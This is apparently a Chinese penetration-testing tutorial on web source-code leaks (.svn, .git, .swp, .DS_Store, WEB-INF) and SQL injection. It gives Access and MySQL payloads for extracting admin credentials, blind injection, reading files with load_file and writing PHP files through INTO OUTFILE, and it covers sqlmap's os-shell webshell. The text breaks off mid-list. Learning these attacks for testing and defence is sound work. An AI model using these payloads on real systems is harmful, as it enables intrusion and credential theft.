<h2 id="SVN源代码泄露"><a href="#SVN源代码泄露" class="headerlink" title="SVN源代码泄露"></a>SVN源代码泄露</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>&emsp;&emsp;管理员对SVN的机制不熟悉，直接将SVN检出到本地的web目录下，而忘记删除.svn目录(文件的类型及内容存放目录),从而导致攻击者拿到站点的源代码。</p>
<h3 id="SVN源代码泄露两个版本的区别"><a href="#SVN源代码泄露两个版本的区别" class="headerlink" title="SVN源代码泄露两个版本的区别"></a>SVN源代码泄露两个版本的区别</h3><p>&emsp;&emsp;SVN1.7后取消了text-base备份文件夹,同时访问.svn/entries返回数字12。1.7以后的版本不会在每个目录下生成.svn的文件，仅在根目录下生成.svn文件。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1522512469.6343105.png" alt=""></p>
<p>&emsp;&emsp;并且在.svn目录下存在wc.db，该数据库文件在NODES表单local_relpath为真实文件名，checksum为文件的sha1值，kind表示文件类型(dir-&gt;目录,file-&gt;文件)</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1522512635.6212754.png" alt=""></p>
<p>&emsp;&emsp;在.svn/pristine目录的二级目录下存储着源代码，文件名是sha1值.svn-base，二级目录名是sha1值的前两位。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1522512799.4691868.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http://www.admintony.com/.svn/pristine/sha1前两位/sha1.svn-base</span><br></pre></td></tr></table></figure>
<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当SVN &lt; 1.7时候，使用Seay法师的svn源代码利用工具</span><br><span class="line"></span><br><span class="line">当SVN &gt; 1,7时候，使用笔者的工具http://admintony.com/2018/02/06/SVN源代码泄露利用工具/</span><br></pre></td></tr></table></figure>
<h2 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h2><p>&emsp;&emsp;从git仓库下载代码的时候，会在本地生成一个.git隐藏文件夹(存放代码的变更记录)，导致攻击者可以使用该文件夹下的信息拿到代码。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1522513028.2894862.png" alt=""></p>
<p>&emsp;&emsp;利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> </p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523635317.507345.png" alt=""></p>
<h2 id="swp源码泄露"><a href="#swp源码泄露" class="headerlink" title="swp源码泄露"></a>swp源码泄露</h2><p>&emsp;&emsp;使用vi编辑器打开文件时，会生成一个<strong>.文件名.swp</strong>的备份文件，防止意外退出等情况导致文件内容丢失。产生原因主要是管理员在web目录下修改代码文件，导致生成了.swp备份文件。</p>
<p>&emsp;&emsp;利用方法：访问.swp文件会下载该文件，然后vi -r 文件名 来恢复内容</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523604220.8482296.png" alt=""></p>
<p>&emsp;&emsp;然后按下任意键就可以看到其中的代码了。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523604262.116939.png" alt=""></p>
<h2 id="数据库外泄"><a href="#数据库外泄" class="headerlink" title="数据库外泄"></a>数据库外泄</h2><p>&emsp;&emsp;不只是源码泄露会导致安全威胁，其实数据库泄露也会导致安全威胁。</p>
<p>&emsp;&emsp;数据库外泄指的是数据库文件泄露，比如ACCESS的数据库是.mdb 以及上面提到的 .db 是SQLite的数据库。这两种数据库系统将数据保存在该格式的文件中，而数据库文件又在WEB目录下，攻击者可以下载数据库从而拿到数据。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523536132.8377483.png" alt=""></p>
<p>&emsp;&emsp;这种漏洞影响最多的是ASP+ACCESS的站点，比较经典两个案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.某些CMS的目录下存在/data/#data.mdb 文件</span><br><span class="line">2.ewebeditor 后台GETSHELL，下载eweb的数据库就是其中关键的一步</span><br></pre></td></tr></table></figure>
<h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><h3 id="WEB-INF介绍"><a href="#WEB-INF介绍" class="headerlink" title="WEB-INF介绍"></a>WEB-INF介绍</h3><p>&emsp;&emsp;WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
<h3 id="漏洞检测和利用"><a href="#漏洞检测和利用" class="headerlink" title="漏洞检测和利用"></a>漏洞检测和利用</h3><p>&emsp;&emsp;通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
<p>&emsp;&emsp;一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，使用了Nginx的安全策略，导致web.xml能够被攻击者访问到。</p>
<h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3><p>&emsp;&emsp;测试目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;取回源码命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<a href="http://www.bitkeeper.org/" target="_blank" rel="noopener">bk下载地址</a></p>
<h2 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title="DS_Store文件泄漏"></a>DS_Store文件泄漏</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>&emsp;&emsp;在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp.py</a></p>
<h2 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>&emsp;&emsp;SQL注入是将恶意SQL语句插入网站的参数中，然后被带入数据库执行的过程。</p>
<p>&emsp;&emsp;SQL注入产生的危害很多，比如后台用户及密码泄露、会员用户的数据泄露、甚至权限足够的情况下可以让攻击者拿到webshell 以及 服务器权限。因此，SQL注入也是OWSP TOP 10的常客。</p>
<h2 id="SQL注入产生原理"><a href="#SQL注入产生原理" class="headerlink" title="SQL注入产生原理"></a>SQL注入产生原理</h2><p>&emsp;&emsp;开发者未对用户提交的数据进行过滤，从而导致恶意语句被带入数据库执行。</p>
<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>&emsp;&emsp;SQL注入的分类很多，不同的人也会将注入分成不同的种类，下面笔者将介绍一下常见的分类。</p>
<h3 id="根据数据库类型分类"><a href="#根据数据库类型分类" class="headerlink" title="根据数据库类型分类"></a>根据数据库类型分类</h3><p>&emsp;&emsp;每一种数据库都有一种注入命名方式，以下是比较常见的数据库注入方式：</p>
<h4 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h4><ul>
<li>0.数据库结构</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523498268.5828621.png" alt=""></p>
<ul>
<li>1.判断注入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2  # 结合正确参数使用</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523463702.8145494.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or 1=1 </span><br><span class="line">or 1=2   # 结合错误参数使用</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523463456.4893951.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor 1=1</span><br><span class="line">xor 1=2  # 结合错误参数使用</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;a XOR b &lt;==&gt; (a and (not b)) or ((not a) and b)</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523494198.6020398.png" alt=""></p>
<p>&emsp;&emsp;还有简单的方法就是在id参数后加特殊符号，如’ “ \ % *等</p>
<p><strong>联合查询法</strong></p>
<ul>
<li>2.查字段个数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 22 # 回显正确</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523495149.2372367.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 23 # 回显错误</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523495190.479328.png" alt=""></p>
<p>&emsp;&emsp;因此存在22个字段。</p>
<p>&emsp;&emsp;<strong>说明：</strong>这里判断出来的字段是当前页面所连接的表的字段个数而非管理员表字段个数；order by 是按照列数据进行排序的函数，用法为：order by 列名，之所以能用来判断列名个数是因为，order by 数字 &lt;==&gt; order by 第n个列名</p>
<ul>
<li>3.猜表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523495840.4374318.png" alt=""></p>
<ul>
<li>4.猜列名并爆数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">admin</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="keyword">password</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523495868.943163.png" alt=""></p>
<ul>
<li>5.如何爆出所有的用户名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> TOP <span class="number">1</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">admin</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">admin</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>逐字猜解法(盲注)</strong></p>
<ul>
<li>1.注入检测</li>
</ul>
<p>&emsp;&emsp;请移步上方不再赘余</p>
<ul>
<li>2.猜表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (<span class="keyword">select</span> * <span class="keyword">from</span> 表名)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523535195.3562996.png" alt=""></p>
<ul>
<li>3.猜列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (<span class="keyword">select</span> 列名 <span class="keyword">from</span> 表名)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523535371.4791112.png" alt=""></p>
<ul>
<li>4.获取数据长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(列名) <span class="keyword">from</span> 表名)&gt;=<span class="number">5</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523535511.7520502.png" alt=""></p>
<ul>
<li>5.获取指定位数的数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(列名,位数,<span class="number">1</span>)) <span class="keyword">from</span> 表)&gt;=<span class="number">97</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523535765.9348018.png" alt=""></p>
<ul>
<li>6.盲注的核心</li>
</ul>
<p>&emsp;&emsp;盲注的核心其实是用字符串截取函数一位一位的截取数据，之后把截取到的数据用字符转ascii函数转换成ascii码和数字进行对比，之后将ascii码还原成字符。</p>
<p>&emsp;&emsp;盲注工具：<a href="http://admintony.com/2017/12/28/ACCESS注入之逐字猜解法-Python工具/" target="_blank" rel="noopener">ACCESS注入之逐字猜解法-Python工具</a></p>
<h4 id="MySQL注入"><a href="#MySQL注入" class="headerlink" title="MySQL注入"></a>MySQL注入</h4><ul>
<li>0.MySQL数据库结构</li>
</ul>
<p>&emsp;&emsp;MySQL 5.0以上版本的数据库结构图</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523788579.513082.png" alt=""></p>
<ul>
<li>1.判断注入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">and 1=1  (and 1)</span><br><span class="line">and 1=2  (and 0)</span><br><span class="line"></span><br><span class="line">or 1=1   (or 1)</span><br><span class="line">or 1=2   (or 0)</span><br><span class="line"></span><br><span class="line">xor 1=1  (xor 1)</span><br><span class="line">xor 1=2  (xor 0)</span><br><span class="line"></span><br><span class="line">特殊符号：&apos; &quot; \ %</span><br></pre></td></tr></table></figure>
<ul>
<li>2.猜列的个数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure>
<ul>
<li>3.查信息</li>
</ul>
<p>&emsp;&emsp;爆显位不同于ACCESS，MySQL爆显位不需要接from子句，但ACCESS要接from子句才可以。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523788910.398044.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select @@version,2,3</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523789140.4208477.png" alt=""></p>
<p>&emsp;&emsp;可查的信息有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system_user() 系统用户名</span><br><span class="line">user() 用户名</span><br><span class="line">current_user 当前用户名</span><br><span class="line">session_user()连接数据库的用户名</span><br><span class="line">database() 数据库名</span><br><span class="line">version() MYSQL数据库版本</span><br><span class="line">@@datadir 读取数据库路径</span><br><span class="line">@@basedir MYSQL 安装路径</span><br><span class="line">@@version_compile_os 操作系统</span><br></pre></td></tr></table></figure>
<ul>
<li>4.查数据库名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523789631.2143135.png" alt=""></p>
<ul>
<li>5.查表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里的table_schema的值可以用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">双引号(单引号)引住明文</span><br><span class="line">明文的16进制字符</span><br><span class="line">database()函数</span><br><span class="line">char(明文的ascii)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523789706.2635062.png" alt=""></p>
<ul>
<li>查列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="built_in">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523790036.3991504.png" alt=""></p>
<ul>
<li>查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">user</span>,pwd,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523790962.4444287.png" alt=""></p>
<ul>
<li>常见问题：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.无法爆出显位，在id前面加上&quot;-&quot;使其报错</span><br><span class="line"></span><br><span class="line">2.注入多个用户的数据 limit i,1</span><br><span class="line"></span><br><span class="line">3.注入所有表或列，使用group_concat、concat、concat_ws函数</span><br><span class="line"></span><br><span class="line">4.order by 和 top 1 不兼容，因为两者都是排序子句，而一般top 1 又在可控参数之前，所以无法使用order by </span><br><span class="line"></span><br><span class="line">5.程序SQL语句中已有order by，一般程序SQL语句中的order by会在可控点之后，那么我们想要使用order by语句判断列数，就要将后面的语句注释掉(e.g. order by 10 %23)</span><br></pre></td></tr></table></figure>
<p><strong>小技巧</strong>：NULL填充判断列数</p>
<p>&emsp;&emsp;有时候order by 无法使用的时候，可以使用NULL填充法判断列数，攻击者可以构造payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="literal">NULL</span>,...,<span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直到页面回显正确，页面回显正确的时候的NULL的个数即是列的数量，确定列的数量以后的注入方法和上面介绍的确定列数量以后的注入方法一致。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524834177.2498262.png" alt=""></p>
<h4 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h4><h4 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h4><h3 id="根据注入点权限划分"><a href="#根据注入点权限划分" class="headerlink" title="根据注入点权限划分"></a>根据注入点权限划分</h3><h4 id="普通权限注入"><a href="#普通权限注入" class="headerlink" title="普通权限注入"></a>普通权限注入</h4><p>&emsp;&emsp;普通权限注入是指所有使用低权限用户连接数据库的注入点，普通权限注入分为两类：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.非root(sa、dba)用户</span><br><span class="line">2.降权后的root、sa、dba</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;普通权限的注入点利用方法很有限，只能对数据库进行增删改查，而不具有文件操作等权限。</p>
<h4 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h4><p>&emsp;&emsp;高权限注入是指所有使用高权限用户(root、sa、dba)连接数据库的注入点。高权限的注入点利用方式很多，不仅限于增删改查，一般还具有读写文件的权限(特殊情况后面介绍)和存储扩展的调用权限</p>
<p>&emsp;&emsp;高权限的注入点产生的危害，包括但不仅限于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.获取数据库中的数据</span><br><span class="line">2.读写文件，读取文件和写shell</span><br><span class="line">3.调用存储扩展获取系统权限(MSSQL)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;影响读写文件的因素：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.是否拥有file权限</span><br><span class="line">2.secure_file_priv选项</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;secure_file_priv选项请参考：<a href="http://admintony.com/2017/11/24/MYSQL新特性限制文件写入及替代方法/" target="_blank" rel="noopener">http://admintony.com/2017/11/24/MYSQL新特性限制文件写入及替代方法/</a></p>
<ul>
<li>读文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">load_file</span>(<span class="string">'D:\\phpStudy\\WWW\\fuzz\\index.php'</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523806039.5955203.png" alt=""></p>
<p><strong>路径注意点：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.路径使用\\ ，否则会被当作转义符号</span><br><span class="line">2.路径使用/</span><br><span class="line">3.盘符根路径下可用c:admin.txt</span><br><span class="line">4.16进制文件名</span><br><span class="line">5.char(路径ascii)</span><br></pre></td></tr></table></figure>
<ul>
<li>写文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'d:\\phpstudy\\www\\fuzz\\phpinfo.php'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523806394.4955816.png" alt=""></p>
<ul>
<li>SQLMAP的os-shell 与 sql-shell</li>
</ul>
<p><strong>–sql-shell</strong></p>
<p>&emsp;&emsp;–sql-shell获取一个sqlShell用于执行SQL命令。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523806692.6630085.png" alt=""></p>
<p>&emsp;&emsp;–os-shell获取一个cmdShell，用于执行cmd命令，对于MSSQL该选项是调用xp..cmdshell存储扩展进行执行命令的;对于MySQL该选项是通过into outfile写入shell,然后再执行命令的,因此对于MySQL需要绝对路径</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523806889.643438.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[1] common location(s) (&apos;C:/xampp/htdocs/, C:/Inetpub/wwwroot/&apos;) (default)  # 常用的网站根路径</span><br><span class="line">[2] custom location(s)  # 用户输入</span><br><span class="line">[3] custom directory list file  # 从文件导入</span><br><span class="line">[4] brute force search  # 爆破</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;对于MySQL os-shell写入的两个马儿说明：第一个是一个小马(上传文件用)；第二个是一个一句话，密码为cmd</p>
<p><strong>小技巧:</strong></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523809016.967756.png" alt=""></p>
<h3 id="根据页面回显不同分类"><a href="#根据页面回显不同分类" class="headerlink" title="根据页面回显不同分类"></a>根据页面回显不同分类</h3><h4 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h4><p>&emsp;&emsp;前面介绍到的那些有回显的注入，就是这里所说的普通注入，因为它们无论是以什么提交方式进行注入的，无论是什么数据库，无论执行的SQL语句是什么，它们都有一个共同的特点，那就是有正常回显。</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>&emsp;&emsp;报错注入是利用数据库的一些函数，通过报错的方法将想要查询的数据显示给攻击者。报错注入有一个限制条件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>  <span class="string">"&lt;br&gt;"</span>.mysql_error();</span><br></pre></td></tr></table></figure>
<p>只有将SQL语句执行的错误信息打印出来才可以看到报错，所以报错注入需要程序能够打印SQL语句执行错误信息。</p>
<p>&emsp;&emsp;MySQL中能够用在报错注入的函数有：</p>
<ul>
<li>第一个</li>
</ul>
